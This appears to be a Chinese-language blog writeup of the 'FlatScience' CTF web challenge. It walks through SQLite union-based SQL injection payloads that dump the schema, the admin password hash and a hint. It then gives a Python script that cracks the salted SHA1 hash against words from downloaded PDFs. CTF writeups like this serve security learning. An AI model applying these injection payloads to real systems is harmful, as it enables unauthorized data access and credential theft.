<!--yml
category: 未分类
date: 2022-04-26 14:51:36
-->

# 攻防世界-web-FlatScience-从0到1的解题历程writeup_CTF小白的博客-CSDN博客

> 来源：[https://blog.csdn.net/qq_41429081/article/details/105519332](https://blog.csdn.net/qq_41429081/article/details/105519332)

## 题目分析

首先拿到题目一脸懵逼，就是套娃界面，一层一层的pdf论文存放的目录。

所以先扫一下目录

![图片](img/8652bb15d6948fd2fa07b9e4727acaa8.png)

发现存在admin.php和login.php，且扫描结果显示login.php有sql注入漏洞

尝试了一下发现登陆成功后就跳转到首页了

![图片](img/3568d40cbbe5f61d0be872c646246814.png)

并且设置了一个cookie内容为+admin

我明明使用test登陆的结果却显示的admin,应该是没有test用户，所以默认取得数据库第一条记录。

然后去看看admin.php

发现提示为“do not even try to bypass this ”

尝试弱口令失败

看了wp才知道有个关键点是

有一个提示是“TODO: Remove ?debug-Parameter!”

所以要构建

```
http://159.138.137.79:55036/login.php?debug 
```

得到关键部分代码

```
if(isset($_POST['usr']) && isset($_POST['pw'])){ 
        $user = $_POST['usr']; 
        $pass = $_POST['pw']; 
        $db = new SQLite3('../fancy.db'); 

        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'"); 
    if($res){ 
        $row = $res->fetchArray(); 
    } 
    else{ 
        echo "<br>Some Error occourred!"; 
    } 
    if(isset($row['id'])){ 
            setcookie('name',' '.$row['name'], time() + 60, '/'); 
            header("Location: /"); 
            die(); 
    } 
} 
```

## 解题流程

原来还是得从login.php注入入手。

使用联合查询

![图片](img/42cb233e70a84741b754d73ef94bdd56.png)

在查数据库的时候尝试构建语句查询失败

```
usr=test' union select 1,database() --&pw=a 
```

![图片](img/150157fcfbfb390144d0d78576f6cfe8.png)

发现是SQLite3 ,和常规的mysql的语句有不同，所以百度补一波SQLite3的注入

发现SQLite注入一般是使用sqlite_master隐藏表

```
usr=test' union select name,sql from sqlite_master; --&pw=a 
```

得到

```
CREATE TABLE Users（id int primary key，name  varchar(255),password varchar(255),hint varchar(255)) 
```

所以我们得到存在Users表的字段为id,name,password,hint
这边容易查询得到admin的password

```
usr=test' union select 1,(select password from Users limit 0,1) --&pw=a 
```

![图片](img/67a664eed629cb77238ecc062a0733cb.png)

得到

```
sha1($pass."Salz!") 
```

结果为3fab54a50e770d830c0416df817567662a9dc85c
然后查询一下hint

```
usr=test' union select 1,(select hint from Users limit 0,1) --&pw=a 
```

结果为‘my fav word in my fav paper?!’
意思就是密码在他的其中一篇paper里面喽？？

随便找了个整站下载软件，先把所有的pdf给下载下来

![图片](img/a4a2bc186e9067eeac588bc5c157d85a.png)

总共应该是30篇paper

最后拿到大佬的exp，在我python3的环境中调着跑了一下

```
from io import StringIO
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import TextConverter
from pdfminer.layout import LAParams
from pdfminer.pdfpage import PDFPage
import sys
import string
import os
import hashlib

def get_pdf():#打开pdf文件
    return [i for i in os.listdir("./") if i.endswith("pdf")]

def convert_pdf_2_text(path):#获取pdf文本
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    with open(path, 'rb') as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text = retstr.getvalue()
    device.close()
    retstr.close()
    return text

def find_password():#读取密码
    pdf_path = get_pdf()
    for i in pdf_path:
        print("Searching word in " + i)
        pdf_text = convert_pdf_2_text(i).split(" ")
        for word in pdf_text:
            sha1_password = hashlib.sha1((word + "Salz!").encode()).hexdigest()
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print("Find the password :" + word)
                exit()

if __name__ == "__main__":
    find_password() 
```

![图片](img/ddc09234ed96be9bc41723dc0797c4cd.png)

得到admin的密码为ThinJerboa

最后在admin.php中登陆即可拿到flag